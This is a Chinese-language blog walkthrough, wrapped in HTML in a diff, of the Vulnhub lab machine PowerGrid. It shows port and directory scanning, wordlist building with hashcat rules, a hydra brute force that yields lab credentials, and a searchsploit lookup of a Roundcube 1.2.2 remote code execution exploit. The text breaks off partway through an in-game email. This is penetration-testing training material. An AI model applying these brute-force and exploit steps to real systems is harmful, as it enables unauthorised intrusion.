@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="笔记哥讲的挺好的，建议大家都可以去b站上搜索&quot;红队笔记&quot;，这台机器也是我放寒假来做的五台机器里强度最高的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub-PowerGrid">
+<meta property="og:url" content="http://example.com/2026/01/27/Done-Vulnhub%E5%BC%BA%E5%BA%A6%E6%9C%BA%E5%99%A8PowerGrid/index.html">
+<meta property="og:site_name" content="Twansh&#x2F;Eminem">
+<meta property="og:description" content="笔记哥讲的挺好的，建议大家都可以去b站上搜索&quot;红队笔记&quot;，这台机器也是我放寒假来做的五台机器里强度最高的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/powergrid.png">
+<meta property="og:image" content="http://example.com/image/powergrid1.png">
+<meta property="og:image" content="http://example.com/image/powergrid2.png">
+<meta property="article:published_time" content="2026-01-27T02:33:44.000Z">
+<meta property="article:modified_time" content="2026-01-30T14:26:15.283Z">
+<meta property="article:author" content="Kwansh">
+<meta property="article:tag" content="靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/powergrid.png">
+
+<link rel="canonical" href="http://example.com/2026/01/27/Done-Vulnhub%E5%BC%BA%E5%BA%A6%E6%9C%BA%E5%99%A8PowerGrid/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Vulnhub-PowerGrid | Twansh/Eminem</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Twansh/Eminem</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/01/27/Done-Vulnhub%E5%BC%BA%E5%BA%A6%E6%9C%BA%E5%99%A8PowerGrid/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Kwansh">
+      <meta itemprop="description" content="往事越千年,魏武挥鞭,东临碣石有遗篇。萧瑟秋风今又是,换了人间">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Twansh/Eminem">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Vulnhub-PowerGrid
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-01-27 10:33:44" itemprop="dateCreated datePublished" datetime="2026-01-27T10:33:44+08:00">2026-01-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-01-30 22:26:15" itemprop="dateModified" datetime="2026-01-30T22:26:15+08:00">2026-01-30</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">笔记哥讲的挺好的，建议大家都可以去b站上搜索"红队笔记"，这台机器也是我放寒假来做的五台机器里强度最高的</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>受益匪浅吧，这些不起眼的东西，或许正是日后决定关键事件走向的东西呢</p>
+<h3 id="Nmap扫描结果"><a href="#Nmap扫描结果" class="headerlink" title="Nmap扫描结果"></a>Nmap扫描结果</h3><p>每次都是力大砖飞，根本不懂红队等在做nmap扫描的时候回考虑到什么，注意到什么</p>
+<p>笔记哥讲的很详细，我会在打完之后重新记录，现在先力大砖飞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.56.107</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-29 23:28 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.107</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: PowerGrid - Turning your lights off unless you pay.</span><br><span class="line">143/tcp open  imap     Dovecot imapd</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent <span class="keyword">time</span></span><br><span class="line">| ssl-cert: Subject: commonName=powergrid</span><br><span class="line">| Subject Alternative Name: DNS:powergrid</span><br><span class="line">| Not valid before: 2020-05-19T16:49:55</span><br><span class="line">|_Not valid after:  2030-05-17T16:49:55</span><br><span class="line">|_imap-capabilities: IDLE LOGINDISABLEDA0001 IMAP4rev1 Pre-login listed LOGIN-REFERRALS more LITERAL+ post-login capabilities STARTTLS ID have SASL-IR ENABLE OK</span><br><span class="line">993/tcp open  ssl/imap Dovecot imapd</span><br><span class="line">| ssl-cert: Subject: commonName=powergrid</span><br><span class="line">| Subject Alternative Name: DNS:powergrid</span><br><span class="line">| Not valid before: 2020-05-19T16:49:55</span><br><span class="line">|_Not valid after:  2030-05-17T16:49:55</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent <span class="keyword">time</span></span><br><span class="line">|_imap-capabilities: IDLE IMAP4rev1 AUTH=PLAINA0001 listed LOGIN-REFERRALS more Pre-login post-login capabilities LITERAL+ ID have ENABLE SASL-IR OK</span><br><span class="line">MAC Address: 08:00:27:9D:7C:D4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 30.53 seconds</span><br></pre></td></tr></table></figure>
+
+<p>看到是存在结果开放的端口，先从web端入手看看，登录上去看看</p>
+<p><img src="/image/powergrid.png" alt="alt text"></p>
+<p>吓哭了，在倒计时，看那段英语应该是说要赎金，不然在3h内切断全欧洲的电力</p>
+<h3 id="web目录渗透"><a href="#web目录渗透" class="headerlink" title="web目录渗透"></a>web目录渗透</h3><p>看着是没什么可以进行交互的玩意，就扫目录看看喽</p>
+<p>力大砖飞的扫描，若是出于红队的考量，可能会限制速率，或者说是进行useragent的更改与认证，模拟正常的流量，同时也可以检查是否存在备份文件</p>
+<p><strong>力大砖飞版本</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# gobuster <span class="built_in">dir</span> -u http://192.168.56.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.8</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.56.107</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.8</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: 301) [Size: 317] [--&gt; http://192.168.56.107/images/]</span><br><span class="line">/zmail                (Status: 401) [Size: 461]</span><br><span class="line">/server-status        (Status: 403) [Size: 279]</span><br><span class="line">Progress: 220558 / 220558 (100.00%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<p><strong>红队细节版</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="zmail路径下的密码本制作与爆破"><a href="#zmail路径下的密码本制作与爆破" class="headerlink" title="zmail路径下的密码本制作与爆破"></a>zmail路径下的密码本制作与爆破</h3><p>根据扫描结果访问&#x2F;zmail，弹出提示框</p>
+<p><img src="/image/powergrid1.png" alt="alt text"></p>
+<p>这很明显是需要我们尝试去爆破登录的(因为也没有其他的提示什么什么的了)</p>
+<p>所以需要自己从页面提取一些关键信息来作为密码本的内容，再根据某些规则，变换制作密码本</p>
+<p>这里我们先提取点页面的关键信息，写入dict</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# <span class="built_in">cat</span> &lt;&lt; <span class="string">&quot;EOF&quot;</span> &gt; dict        </span><br><span class="line">heredoc&gt; power       </span><br><span class="line">heredoc&gt; powergrid   </span><br><span class="line">heredoc&gt; europegrid                                               </span><br><span class="line">heredoc&gt; grid                                                                                                 </span><br><span class="line">heredoc&gt; deez1</span><br><span class="line">heredoc&gt; p48         </span><br><span class="line">heredoc&gt; all2       </span><br><span class="line">heredoc&gt; hacker                                                                         </span><br><span class="line">heredoc&gt; EOF      </span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后再软链接一个规模最小的密码变换规则来（这步是为了后续方便接着操作，少敲命令），这样子可以制作出一个差不多的密码本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# <span class="built_in">ln</span> -s /usr/share/hashcat/rules/</span><br><span class="line">Completing <span class="built_in">link</span> target</span><br><span class="line">best64.rule                                     T0XlC_3_rule.rule                             </span><br><span class="line">combinator.rule                                 T0XlC-insert_00-99_1950-2050_toprules_0_F.rule</span><br><span class="line">d3ad0ne.rule                                    T0XlC_insert_HTML_entities_0_Z.rule           </span><br><span class="line">dive.rule                                       T0XlC-insert_space_and_special_0_F.rule       </span><br><span class="line">generated2.rule                                 T0XlC-insert_top_100_passwords_1_G.rule       </span><br><span class="line">generated.rule                                  T0XlC.rule                                    </span><br><span class="line">hybrid/                                         T0XlCv2.rule                                  </span><br><span class="line">Incisive-leetspeak.rule                         toggles1.rule                                 </span><br><span class="line">InsidePro-HashManager.rule                      toggles2.rule                                 </span><br><span class="line">InsidePro-PasswordsPro.rule                     toggles3.rule                                 </span><br><span class="line">leetspeak.rule                                  toggles4.rule                                 </span><br><span class="line">oscommerce.rule                                 toggles5.rule                                 </span><br><span class="line">rockyou-30000.rule                              unix-ninja-leetspeak.rule                     </span><br><span class="line">specific.rule       </span><br></pre></td></tr></table></figure>
+
+
+<p>然后生成一个新的密码本，共有616个密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# hashcat --stdout dict -r best64.rule &gt; dict.best64</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# <span class="built_in">wc</span> -l dict.best64             </span><br><span class="line">616 dict.best64</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>当然这个密码本还是过于小了，需要自己去追加一点常规的密码本进来，还有过滤一些关键词有关的但是要注意保持轻量，否则大量异常流量是很违背红队原则的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# <span class="built_in">cat</span> rockyou.txt | grep -iE <span class="string">&quot;power|grid|europe&quot;</span> &gt;&gt; dict.best64</span><br><span class="line">                                                                                                                                        </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# <span class="built_in">wc</span> -l dict.best64</span><br><span class="line">7253 dict.best64</span><br></pre></td></tr></table></figure>
+
+<p>然后hydra开爆破，同时用time监测一下自己所需要，所用的时间</p>
+<p>爆出来了，用户名和密码是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p48:electrico</span><br></pre></td></tr></table></figure>
+
+<p>连续两个登录进入后台<br><img src="/image/powergrid2.png" alt="alt text"></p>
+<p>这个后台是roundcube这个开源的web服务，需要确定这个web服务的版本来确定是否有历史nday可以利用</p>
+<p>这里依旧试试爆破路径，看一下能不能泄露出一些关键的信息来为我所用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# gobuster <span class="built_in">dir</span> -u http://192.168.56.107/zmail -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --useragent <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&quot;</span> --discover-backup -x php,txt,md,rar,zip -H <span class="string">&quot;Authorization:Basic cDQ4OmVsZWN0cmljbw==&quot;</span> -c <span class="string">&quot;roundcube_sessid=st981g69ed77nsu5s8ckmk4l9u;&quot;</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.8</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.56.107/zmail</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] Cookies:                 roundcube_sessid=st981g69ed77nsu5s8ckmk4l9u;</span><br><span class="line">[+] User Agent:              Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span><br><span class="line">[+] Extensions:              php,txt,md,rar,zip</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.php            (Status: 200) [Size: 5830]</span><br><span class="line">/skins                (Status: 301) [Size: 322] [--&gt; http://192.168.56.107/zmail/skins/]</span><br><span class="line">/bin                  (Status: 301) [Size: 320] [--&gt; http://192.168.56.107/zmail/bin/]</span><br><span class="line">/plugins              (Status: 301) [Size: 324] [--&gt; http://192.168.56.107/zmail/plugins/]</span><br><span class="line">/program              (Status: 301) [Size: 324] [--&gt; http://192.168.56.107/zmail/program/]</span><br><span class="line">/README.md            (Status: 200) [Size: 3736]</span><br><span class="line">/temp                 (Status: 403) [Size: 279]</span><br><span class="line">/vendor               (Status: 301) [Size: 323] [--&gt; http://192.168.56.107/zmail/vendor/]</span><br><span class="line">/config               (Status: 403) [Size: 279]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 26]</span><br><span class="line">/logs                 (Status: 403) [Size: 279]</span><br><span class="line">/INSTALL              (Status: 200) [Size: 9954]</span><br><span class="line">/LICENSE              (Status: 200) [Size: 35147]</span><br><span class="line">/SQL                  (Status: 301) [Size: 320] [--&gt; http://192.168.56.107/zmail/SQL/]</span><br></pre></td></tr></table></figure>
+
+<p>虽然还没扫完，但是那么大的README.md我还是看到的了，所以接下来去看一下这里面是什么</p>
+<p>cao了，没有任何版本信息，最后在CHANGELOG里找到了版本信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">CHANGELOG Roundcube Webmail</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">RELEASE 1.2.2</span><br><span class="line">-------------</span><br><span class="line">- Enigma: Add possibility to configure gpg-agent binary location (enigma_pgp_agent)</span><br><span class="line">- Enigma: Fix signature verification with some IMAP servers, e.g. Gmail, DBMail (#5371)</span><br><span class="line">- Enigma: Make recipient key searches case-insensitive (#5434)</span><br><span class="line">- Fix regression <span class="keyword">in</span> resizing JPEG images with Imagick (#5376)</span><br><span class="line">- Managesieve: Fix parsing of vacation date-time with non-default date_format (#5372)</span><br><span class="line">- Use SymLinksIfOwnerMatch <span class="keyword">in</span> .htaccess instead of FollowSymLinks disabled on some hosts <span class="keyword">for</span> security reasons (#5370)</span><br><span class="line">- Wash position:fixed style <span class="keyword">in</span> HTML mail <span class="keyword">for</span> better security (#5264)</span><br><span class="line">- Fix bug <span class="built_in">where</span> memcache_debug didn<span class="string">&#x27;t work for session operations</span></span><br><span class="line"><span class="string">- Fix bug where Message-ID domain part was tied to username instead of current identity (#5385)</span></span><br><span class="line"><span class="string">- Fix bug where blocked.gif couldn&#x27;</span>t be attached to reply/forward with insecure content</span><br><span class="line">- Fix E_DEPRECATED warning when using Auth_SASL::factory() (#5401)</span><br><span class="line">- Fix bug <span class="built_in">where</span> names of downloaded files could be malformed when derived from the message subject (#5404)</span><br><span class="line">- Fix so <span class="string">&quot;All&quot;</span> messages selection is resetted on search reset (#5413)</span><br><span class="line">- Fix bug <span class="built_in">where</span> folder creation could fail <span class="keyword">if</span> personal namespace contained more than one entry (#5403)</span><br><span class="line">- Fix error causing empty INBOX listing <span class="keyword">in</span> Firefox when using an URL with user:password specified (#5400)</span><br><span class="line">- Fix PHP warning when handling shared namespace with empty prefix (#5420)</span><br><span class="line">- Fix so folders list is scrolled to the selected folder on page load (#5424)</span><br><span class="line">- Fix so when moving to Trash we make sure the folder exists (#5192)</span><br><span class="line">- Fix displaying size of attachments with zero size</span><br><span class="line">- Fix so <span class="string">&quot;Action disabled&quot;</span> error uses more appropriate 404 code (#5440)</span><br></pre></td></tr></table></figure>
+
+<p><strong>版本是1.2.2</strong></p>
+<p>搜一下有没有对应的exploit</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# searchsploit roundcube 1.2.2</span><br><span class="line">------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                                                                        |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Roundcube 1.2.2 - Remote Code Execution                                                               | php/webapps/40892.txt</span><br><span class="line">------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
+
+<p>是一个rce的洞，那现在有戏了</p>
+<p>下载下来查看内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# searchsploit roundcube -m 40892.txt</span><br><span class="line">[!] Could not find EDB-ID <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Exploit: Roundcube 1.2.2 - Remote Code Execution</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/40892</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/40892.txt</span><br><span class="line">    Codes: N/A</span><br><span class="line"> Verified: True</span><br><span class="line">File Type: Unicode text, UTF-8 text</span><br><span class="line">Copied to: /home/kali/40892.txt</span><br></pre></td></tr></table></figure>
+
+<p>接下来在后台里翻找到一封important的邮件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">Listen carefully. We are close to our attack <span class="built_in">date</span>. Nothing is going to stop us now. Our malware is heavily planted <span class="keyword">in</span> each power grid across Europe. All it takes is a signal from this server after the timer has stopped, and nothing is going to stop that now. For information, I have setup a backup server located on the same network - you shouldn<span class="string">&#x27;t need to access it for now, but if you do, scan for its local IP and use the SSH key encrypted below (it is encrypted with your GPG key, by the way). The backup server has root access to this main server - if you need to make any backups, I will leave it for you to work out how. I haven&#x27;</span>t got <span class="keyword">time</span> to explain - we are too close to 